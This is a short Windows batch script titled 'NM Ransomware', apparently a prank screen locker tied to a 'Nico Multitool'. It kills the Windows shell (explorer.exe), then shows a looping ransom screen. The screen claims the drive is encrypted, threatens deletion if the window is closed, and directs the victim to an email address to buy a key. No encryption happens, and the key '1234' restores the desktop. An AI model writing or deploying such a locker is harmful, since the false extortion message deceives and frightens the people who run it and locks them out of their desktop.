color 0A
@echo off
title NM Ransomware
start /min "dummy" cmd /c exit
taskkill /f /im explorer.exe
:bucle
cls
echo You have been a victim of NM ransomware
echo ===================================================================================================
echo The data on your hard drive has been encrypted
echo If you close this window or turn off the PC, all data will be deleted
echo It is impossible to recover your data without a special KEY
echo To receive the key, send an email to nicomultitoolontop@mail.com and ask for the price of the key.
echo ===================================================================================================
echo.
set /p pass=Key:
if %pass%==1234 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Thanks for using Nico Multitool!
start explorer.exe
pause
exit                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              